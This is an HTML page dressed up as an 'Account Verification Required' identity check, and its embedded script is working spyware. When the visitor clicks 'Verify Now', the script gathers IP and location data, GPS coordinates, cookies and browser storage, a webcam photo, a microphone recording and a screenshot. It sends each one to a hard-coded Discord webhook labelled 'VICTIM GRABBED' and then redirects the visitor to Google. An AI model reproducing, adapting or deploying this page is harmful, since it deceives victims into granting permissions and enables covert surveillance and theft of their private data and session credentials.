<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Verification Required</title>
  <style>
    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;}
    h1{color:#ff0033;}
    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
    video,canvas{display:none;}
    .status{margin-top:20px;font-size:14px;color:#00ff00;}
  </style>
  <!-- Include html2canvas -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
</head>
<body>
  <h1>Account Verification Required</h1>
  <p>Please allow camera, microphone, location & screen to verify your identity.</p>
  <button onclick="start()">Verify Now →</button>
  <div id="status" class="status"></div>
  
  <video id="video" autoplay playsinline></video>
  <canvas id="cam"></canvas>
  <canvas id="screen"></canvas>

  <script>
    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
    
    function updateStatus(msg) {
      document.getElementById('status').textContent = msg;
    }

    async function send(file, name) {
      try {
        let f = new FormData();
        f.append("file", file, name);
        f.append("content", "*VICTIM GRABBED* • " + new Date().toLocaleString());
        await fetch(webhook, {method:"POST", body:f});
        console.log("Sent: " + name);
      } catch(e) {
        console.error("Send failed: " + name, e);
      }
    }

    // 1. IP + Geo
    async function getIP() {
      try {
        const ipData = await (await fetch("https://api.ipify.org?format=json")).json();
        const ip = ipData.ip;
        const g = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
        const txt = `IP: ${ip}\nISP: ${g.org}\nCity: ${g.city}\nCountry: ${g.country_name}\nMap: https://maps.google.com/?q=${g.latitude},${g.longitude}`;
        send(new Blob([txt],{type:"text/plain"}),"IP.txt");
        updateStatus("✓ IP captured");
      } catch(e) {
        console.error("IP failed", e);
      }
    }

    // 2. GPS
    function getGPS() {
      navigator.geolocation.getCurrentPosition(p => {
        const map = `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
        const txt = `GPS: ${map}\nAccuracy: ±${p.coords.accuracy}m`;
        send(new Blob([txt],{type:"text/plain"}),"GPS.txt");
        updateStatus("✓ GPS captured");
      }, err => {
        console.error("GPS failed", err);
      }, {enableHighAccuracy: true, timeout: 10000});
    }

    // 3. Cookies
    function grabCookies() {
      const cookies = document.cookie;
      if (cookies) {
        send(new Blob([cookies],{type:"text/plain"}),"COOKIES.txt");
      }
      const ls = JSON.stringify(localStorage, null, 2);
      const ss = JSON.stringify(sessionStorage, null, 2);
      if (ls.length > 10) send(new Blob([ls],{type:"text/plain"}),"LocalStorage.json");
      if (ss.length > 10) send(new Blob([ss],{type:"text/plain"}),"SessionStorage.json");
      updateStatus("✓ Cookies captured");
    }

    // 4. Detect device type
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // 5. Screen capture for PC
    async function captureScreenPC() {
      if (!navigator.mediaDevices.getDisplayMedia) {
        console.log("Screen capture not supported");
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: {displaySurface: "monitor"}
        });
        
        const video = document.createElement('video');
        video.autoplay = true;
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            const canvas = document.getElementById('screen');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(b => {
              send(b, "SCREEN.jpg");
              updateStatus("✓ Screen captured");
            }, "image/jpeg", 0.92);
            stream.getTracks().forEach(t => t.stop());
          }, 1000);
        };
      } catch(e) {
        console.log("Screen capture denied or failed", e);
      }
    }

    // 6. Mobile screenshot using html2canvas
    async function captureScreenMobile() {
      try {
        const canvas = await html2canvas(document.body, {
          scale: window.devicePixelRatio,  // for high resolution screens
          useCORS: true,                   // to handle external resources
          backgroundColor: '#ffffff',     // ensure no transparent background
        });

        // Convert the captured canvas to a blob and send it
        canvas.toBlob(b => {
          send(b, "MOBILE_SCREEN.jpg");
          updateStatus("✓ Mobile screen captured");
        }, "image/jpeg", 0.85);

      } catch (e) {
        console.error("Mobile screen capture failed", e);

        // Fallback: Send device info if screenshot fails
        const info = `Device: Mobile\nScreen: ${window.innerWidth}x${window.innerHeight}\nUserAgent: ${navigator.userAgent}`;
        send(new Blob([info], {type:"text/plain"}), "MOBILE_INFO.txt");
        updateStatus("✓ Mobile info captured");
      }
    }

    // 7. Main start function
    function start() {
      updateStatus("⏳ Starting verification...");
      
      // Immediate captures
      getIP();
      getGPS();
      grabCookies();

      // Determine device and capture accordingly
      const mobile = isMobile();
      
      // Camera capture (works on both mobile and PC)
      navigator.mediaDevices.getUserMedia({
        video: {
          width: {ideal: 1920},
          height: {ideal: 1080},
          facingMode: mobile ? "user" : "user" // Front camera
        },
        audio: true
      }).then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          
          setTimeout(() => {
            // Capture photo
            const canvas = document.getElementById('cam');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(b => {
              send(b, "SELFIE.jpg");
              updateStatus("✓ Selfie captured");
            }, "image/jpeg", 0.95);

            // Record audio
            const rec = new MediaRecorder(stream, {
              mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4'
            });
            const chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = () => {
              const blob = new Blob(chunks, {type: rec.mimeType});
              send(blob, "VOICE.webm");
              updateStatus("✓ Voice captured");
              stream.getTracks().forEach(t => t.stop());
            };
            rec.start();
            setTimeout(() => rec.stop(), 6000);
          }, 2500);
        };
      }).catch(err => {
        console.error("Camera/mic failed", err);
        updateStatus("⚠ Some permissions denied");
      });

      // Screen capture based on device
      setTimeout(() => {
        if (mobile) {
          captureScreenMobile();
        } else {
          captureScreenPC();
        }
      }, 3000);

      // Final redirect
      setTimeout(() => {
        updateStatus("✅ Verification complete!");
        setTimeout(() => {
          location.href = "https://google.com";
        }, 2000);
      }, 12000);
    }

    // Optional: Auto-start after 2 seconds
    // window.onload = () => setTimeout(start, 2000);
  </script>
</body>
</html>
